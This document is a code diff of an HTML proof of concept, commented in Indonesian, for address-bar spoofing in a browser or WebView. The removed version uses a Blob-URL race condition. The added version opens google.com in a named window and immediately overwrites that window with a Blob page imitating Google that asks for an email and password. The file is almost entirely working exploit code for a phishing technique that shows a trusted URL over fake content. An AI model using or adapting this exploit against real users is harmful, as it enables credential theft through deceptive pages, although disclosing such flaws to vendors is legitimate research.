@@ -1,21 +1,63 @@
-<script>
-    function spoofBlob() {
-        let payload = `
-      <script>
-        // Paksa ganti URL ke target tanpa menambah history
-        location.replace('https://www.google.com/');
-        
-        // Coba race condition lagi dari dalam konteks Blob
-        setTimeout(() => {
-          document.write('<h1>Google Spoofed from Blob!</h1>');
-          document.close();
-        }, 10);
-      <\/script>
-    `;
+<!DOCTYPE html>
+<html lang="en">
 
-        let blob = new Blob([payload], { type: 'text/html' });
-        let url = URL.createObjectURL(blob);
-        window.open(url, "_blank");
-    }
-</script>
-<button onclick="spoofBlob()">Test Blob Spoof</button>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Address Bar Spoofing</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h2>Test Varian Baru: Window Target Confusion</h2>
+    <button onclick="executeSpoof()">Jalankan Exploit</button>
+
+    <script>
+        function executeSpoof() {
+            // 1. Siapkan konten Phishing / Spoofed Page
+            let spoofedContent = `
+                <html>
+                <head>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Google</title>
+                </head>
+                <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+                    <h1 style="color: red;">This is NOT Google!</h1>
+                    <p>Bypass berhasil. Silakan masukkan kredensial Anda.</p>
+                    <input type="text" placeholder="Email" style="padding: 10px; margin: 5px;"><br>
+                    <input type="password" placeholder="Password" style="padding: 10px; margin: 5px;"><br>
+                    <button style="padding: 10px 20px; margin-top: 10px;">Login</button>
+                </body>
+                </html>
+            `;
+
+            // 2. Bungkus ke dalam Blob URL
+            let blob = new Blob([spoofedContent], { type: 'text/html' });
+            let blobUrl = URL.createObjectURL(blob);
+
+            // 3. TARGET CONFUSION LOGIC
+            // Buka URL asli dengan nama window 'target_win'
+            window.open('https://www.google.com/', 'target_win');
+
+            // Langsung timpa window yang bernama 'target_win' dengan Blob URL kita
+            // Kita tidak pakai setTimeout, kita biarkan logic WebView yang berantakan
+            window.open(blobUrl, 'target_win');
+        }
+    </script>
+
+</body>
+
+</html>
